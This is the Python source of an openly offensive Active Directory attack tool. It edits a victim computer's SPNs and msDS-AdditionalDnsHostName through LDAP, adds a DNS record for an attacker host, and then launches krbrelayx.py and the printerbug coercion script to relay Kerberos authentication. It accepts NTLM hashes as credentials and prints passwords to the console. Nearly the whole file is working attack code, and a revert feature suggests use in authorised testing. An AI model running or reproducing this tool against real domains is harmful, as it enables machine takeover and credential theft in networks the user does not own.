import sys
import argparse
import ldapdomaindump
import random
import string
import getpass
import os, json
import platform
from ast import literal_eval
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from ldap3 import NTLM, Server, Connection, ALL, LEVEL, BASE, MODIFY_DELETE, MODIFY_ADD, MODIFY_REPLACE, SASL, KERBEROS
from lib.utils.kerberos import ldap_kerberos
import ldap3
import datetime
from ldap3.protocol.microsoft import security_descriptor_control
from windows_enums import * 
from dns_library import * 


controls = security_descriptor_control(sdflags=0x04)

ATTACKER_MACHINE = ""
ATTACKER_IP = ""
HOSTNAME_VICTIM = ""
LDAP_SERVER_IP = ""
USERNAME = ""
PASSWORD = ""
flags = ['HOST', 'CIFS', 'HTTP']
ADDED_SPNS = []


def revert_changes(args, CONNECTION_BIND_RETURN, LDAP_HANDLE):
    with open(args.revert_to_state, "r") as FILE:
        config = json.loads(FILE.read())
        HOSTNAME = ""
        if config['changes_made']:
            print("Removeing the following SPNs",config['changes_made'])
            for SPN in literal_eval(config['changes_made']):
                if(config['sAMAccountName'][0]):
                    HOSTNAME = config['sAMAccountName'][0]
                else:
                    HOSTNAME = config['dnsHostName'][0]

                SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME, SPN=SPN,action=REMOVE)

                SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM=HOSTNAME ,action=REMOVE_ADDITIONAL)

        
        if config.get('added_dns_record', None):
            counter = 0
            HOST_TO_REMOVE, IP = config['added_dns_record'][counter]
            USERNAME = args.user
            PASSWORD = args.password
            ATTACKER_MACHINE = HOST_TO_REMOVE
            ATTACKER_IP = IP
            ATTACKER_HOSTNAME = ATTACKER_MACHINE.split(".")[0]
            LDAP_SERVER_IP = args.host


            print("\n\nRemoving DNS Records: %s AT %s" % (ATTACKER_HOSTNAME, ATTACKER_IP))
            CONNECTION_BIND_RETURN, LDAP_HANDLE = perform_ldap_login(USERNAME , LDAP_SERVER_IP, PASSWORD)
            DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, ATTACKER_HOSTNAME, ATTACKER_IP, LDAP_SERVER_IP, ACTION=REMOVE_RECORD)
            counter += counter



    print("State after revert: \n")
    if(config['sAMAccountName'][0]):
        HOSTNAME = config['sAMAccountName'][0]
    else:
        HOSTNAME = config['dnsHostName'][0]

    current_state = str(Query_Machine_Object(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME))
    if config.get('added_dns_record', None):
        DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOST_TO_REMOVE, IP, LDAP_SERVER_IP, ACTION=QUERY_RECORD)
    

def add_spns_for_attack(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, ATTACKER_MACHINE):
    current_state = str(Query_Machine_Object(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM))

    COUNTINUE =  input("[+] continue? y/n ")
    if COUNTINUE.lower() == "y":
        for service in flags:
            SPN_TO_ADD = "%s/%s" % (service, HOSTNAME_VICTIM.replace("$", ""))

            if(SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, SPN_TO_ADD, ADD)):
                ADDED_SPNS.append(SPN_TO_ADD)



        SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, ATTACKER_MACHINE, ADDITIONAL)
        for service in flags:
            SPN_TO_ADD = "%s/%s" % (service, ATTACKER_MACHINE)
            SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, SPN_TO_ADD, ADD)
                
         
        Query_Machine_Object(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM)
    else:
        exit()
        
                

    current_state_JSON = literal_eval(current_state)
    current_state_JSON['changes_made'] = str(ADDED_SPNS)
    return current_state_JSON



def perform_ldap_login(domain_username, ldap_server_ip ,domain_password=None, use_kerberos=False, _dc_ip=None, aesKey=None):
    authentication = None
    CONNECTION_BIND = None
    if not domain_username or not '\\' in domain_username:
        print_f('Username must include a domain, use: DOMAIN\\username')
        sys.exit(1)

    domain, user = domain_username.split('\\', 1)
    if not use_kerberos: # If False we are using NTLM
        authentication = NTLM
        sasl_mech = None
        if domain_password is None: # if not password was provided
            domain_password = getpass.getpass() # as for a password
        
    else: # If use_kerberos is True, lets use it for authenticaiton 
        TGT = None
        TGS = None
        try: 
            # Hashes
            lmhash, nthash = domain_password.split(':')
            assert len(nthash) == 32
            password = ''
        except:
            # Password
            lmhash = ''
            nthash = ''
            password = domain_password           
        ##
        if 'KRB5CCNAME' in os.environ and os.path.exists(os.environ['KRB5CCNAME']):
            domain, user, TGT, TGS = CCache.parseFile(domain, user, 'ldap/%s' % ldap_server_ip)

        if _dc_ip is None:
            kdcHost = domain
        else:
            kdcHost = _dc_ip

        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        if not TGT and not TGS:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
        elif TGT:
            # Has TGT
            tgt = TGT['KDC_REP']
            cipher = TGT['cipher']
            sessionKey = TGT['sessionKey']
        if not TGS:
            # Request TGS
            serverName = Principal('ldap/%s' % ldap_server_ip, type=constants.PrincipalNameType.NT_SRV_INST.value)
            TGS = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
        else:
            # Convert to tuple expected
            TGS = (TGS['KDC_REP'], TGS['cipher'], TGS['sessionKey'], TGS['sessionKey'])

        authentication = SASL
        sasl_mech = KERBEROS

    
    # define the server and the connection
    print_m('Connecting to host...')
    print_m('Binding to host')
    if authentication == NTLM:
        print_m("Using %s with password: %s AT server: %s" % (domain_username, domain_password, ldap_server_ip))
        LDAP_SERVER_HANDLE = Server(ldap_server_ip, get_info=ALL)
        CONNECTION_BIND = Connection(LDAP_SERVER_HANDLE, user=domain_username, password=domain_password, authentication=authentication, sasl_mechanism=sasl_mech)
        if not CONNECTION_BIND.bind():
            print_f('Could not bind with specified credentials')
            print_f(CONNECTION_BIND.result)
            sys.exit(1)
    else:
        ldap_kerberos(domain, kdcHost, None, userName, CONNECTION_BIND, ldap_server_ip, TGS)

    print_o('Bind OK')

    return (CONNECTION_BIND, LDAP_SERVER_HANDLE)


def SET_SPN_ForMachine(CONNECTION_BIND, LDAP_SERVER_HANDLE, HOSTNAME_VICTIM, SPN=None, action=2):


    if HOSTNAME_VICTIM:
        targetuser = HOSTNAME_VICTIM
    else:
        targetuser = HOSTNAME_VICTIM.split('\\')[1]

   
    if "$" in targetuser:
        QUERY_STRING = '(SAMAccountName=%s)' % targetuser
    else:
        QUERY_STRING = '(dnsHostName=%s)' % targetuser # full FQDN

    CONNECTION_BIND.search(LDAP_SERVER_HANDLE.info.other['defaultNamingContext'][0], QUERY_STRING, controls=controls, attributes=['SAMAccountName', 'servicePrincipalName', 'dnsHostName', 'msds-additionaldnshostname'])

    try:
        targetobject = CONNECTION_BIND.entries[0]
        print_o('Found modification target')
    except IndexError:
        print_f('Target not found!')
        return False


    """Set the action we are going to peform on this LDAP field"""
    if action == REMOVE:
        operation = ldap3.MODIFY_DELETE

    elif action == CLEAR or action == REMOVE_ADDITIONAL:
        operation = ldap3.MODIFY_REPLACE

    else:
        operation = ldap3.MODIFY_ADD


    additional = True if action == ADDITIONAL else False

    if additional: # If additional is needed
        try:
            host = SPN.split('/')[1]
        except IndexError:
            # Assume this is the hostname
            host = SPN

        CONNECTION_BIND.modify(targetobject.entry_dn, {'msds-additionaldnshostname':[(operation, [host])]})


    else: 

        if action == CLEAR:
            print_o('Printing object before clearing')
            print(targetobject)
            CONNECTION_BIND.modify(targetobject.entry_dn, {'servicePrincipalName':[(operation, [])]})
            CONNECTION_BIND.modify(targetobject.entry_dn, {'msDS-AdditionalDnsHostName':[(operation, [])]})
            # msds-additionaldnshostname

        elif action == REMOVE:
            CONNECTION_BIND.modify(targetobject.entry_dn, {'servicePrincipalName':[(operation, [SPN])]})
            # msds-additionaldnshostname

        elif action == REMOVE_ADDITIONAL:
            CONNECTION_BIND.modify(targetobject.entry_dn, {'msDS-AdditionalDnsHostName':[(operation, [])]})


        elif action == ADD:
            CONNECTION_BIND.modify(targetobject.entry_dn, {'servicePrincipalName':[(operation, [SPN])]})        


    if CONNECTION_BIND.result['result'] == 0:
        print_o('SPN Modified successfully')
        return True


    else:
        if CONNECTION_BIND.result['result'] == 50:
            print_f('Could not modify object, the server reports insufficient rights: %s' % CONNECTION_BIND.result['message'])
        elif CONNECTION_BIND.result['result'] == 19:
            print_f('Could not modify object, the server reports a constrained violation')
            if additional:
                print_f('You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs ending on the domain FQDN)')
            else:
                print_f('You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)')
                print_f('To add any SPN in the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute')
        else:
            print_f('The server returned an error: %s' % CONNECTION_BIND.result['message']) 
            print_f(f"{HOSTNAME_VICTIM}, {SPN}")   
        
        return False


def Query_Machine_Object(CONNECTION_BIND, LDAP_SERVER_HANDLE, HOSTNAME_VICTIM):
    if HOSTNAME_VICTIM:
        targetuser = HOSTNAME_VICTIM
    else:
        targetuser = HOSTNAME_VICTIM.split('\\')[1]

   
    if "$" in targetuser:
        QUERY_STRING = '(SAMAccountName=%s)' % targetuser
    else:
        QUERY_STRING = '(dnsHostName=%s)' % targetuser

    

    # We set it to defaultNamingContext at the server - this basically means, BIND to the current domain, 
    # might require changes when dealing with a subdomain, but at the same time we could just 
    # execute the attack at the child domain domain controller

    CONNECTION_BIND.search(LDAP_SERVER_HANDLE.info.other['defaultNamingContext'][0], QUERY_STRING, controls=controls, attributes=['SAMAccountName', 'servicePrincipalName', 'dnsHostName', 'msds-additionaldnshostname', 'useraccountcontrol'])
    try:
        targetobject = CONNECTION_BIND.entries[0]
        print(targetobject)
        targetobject = CONNECTION_BIND.entries[0].entry_attributes_as_dict
        
    
        targetobject['userAccountControl'][0] = decode_user_account_control(targetobject['userAccountControl'][0])
        print_o("Found Target")
        #print(targetobject)
        return targetobject
    except IndexError:
        print_f('Target not found!')
        return


def main():
    parser = argparse.ArgumentParser(description='Add an SPN to a user/computer account')
    parser._optionals.title = "Main options"
    parser._positionals.title = "Required options"

    #Main parameters
    parser.add_argument("host", metavar='HOSTNAME', help="Hostname/ip or ldap://host:port connection string to connect to")
    # Positional Argument
    parser.add_argument("-u", "--user", metavar='USERNAME', help="DOMAIN\\username for authentication", required=True)
    parser.add_argument("-p", "--password", metavar='PASSWORD', help="Password or LM:NTLM hash, will prompt if not specified")


    # Optional
    parser.add_argument("-t", "--target", metavar='TARGET', help="Computername or username to target (FQDN or COMPUTER$ name, if unspecified user with -u is target)")
    parser.add_argument("-aip", "--attacker-ip", metavar='ATTACKERIP', help="IP Of the Attacker")
    parser.add_argument("-r", "--revert-to-state", metavar='REVERTFILE', help="Path to the revent state file generated by this script")
    parser.add_argument("-ah", "--attacker-hostname", metavar='ATTACKERHOST', help="DNS Hostname Of the Attacker (full FQDN is MUST!)")

    # Optional
    parser.add_argument('-k', '--kerberos', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')

    # Optional
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
   
    args = parser.parse_args()
    LDAP_SERVER_IP = args.host

    USERNAME = args.user
    PASSWORD = args.password
    KERBEROS_USE = args.kerberos

    CONNECTION_BIND_RETURN, LDAP_HANDLE = perform_ldap_login(USERNAME , LDAP_SERVER_IP, PASSWORD, use_kerberos=KERBEROS_USE)
    if args.revert_to_state:
        revert_changes(args, CONNECTION_BIND_RETURN, LDAP_HANDLE)
        exit()

    ATTACKER_MACHINE = args.attacker_hostname
    ATTACKER_IP = args.attacker_ip
    ATTACKER_HOSTNAME = ATTACKER_MACHINE.split(".")[0]
    HOSTNAME_VICTIM = args.target


# ####################################################################################################
#     """The below 4 lines is for debugging, it will remove all SPNs from the victim machine"""

    # SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, action=CLEAR)
    # DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, ATTACKER_MACHINE, ATTACKER_IP, LDAP_SERVER_IP, ACTION=REMOVE_RECORD)
    # SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, action=CLEAR)
    # DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, ATTACKER_MACHINE, ATTACKER_IP, LDAP_SERVER_IP, ACTION=REMOVE_RECORD)


    current_state_JSON = add_spns_for_attack(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, ATTACKER_MACHINE)
    if(DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, ATTACKER_HOSTNAME, ATTACKER_IP, LDAP_SERVER_IP, ACTION=ADD_RECORD)):
        current_state_JSON['added_dns_record'] = [(ATTACKER_MACHINE, ATTACKER_IP)]
        DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, ATTACKER_HOSTNAME, ATTACKER_IP, LDAP_SERVER_IP, ACTION=QUERY_RECORD)
        print(current_state_JSON)


    ct = str(datetime.datetime.now())
    ct = ct.replace(" ", "--")  

    
    statename = HOSTNAME_VICTIM.replace("$", "")+"-"+ct
    is_windows = any(platform.win32_ver())
    if is_windows:
        statename = statename.replace(":", "-")

    print_m("Saving statefile of changes: %s" % statename)
    with open(statename,"w+") as FILE:
        FILE.write(json.dumps(current_state_JSON)) 

    is_windows = any(platform.win32_ver())


    if not is_windows:
        os.system("x-terminal-emulator -e python3 krbrelayx.py -hashes %s" % PASSWORD)
        print("\nExeute: Execute coerce attack against: %s" % (ATTACKER_MACHINE))
        os.system("python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
        print("Executing: python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
    else:
        print("\nExeute: python3 krbrelayx.py -hashes %s" % PASSWORD)
        print("Execute coerce attack against: %s" % (ATTACKER_MACHINE))
        print("Example: python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))


    

        
if __name__ == "__main__":
  
    main()

    









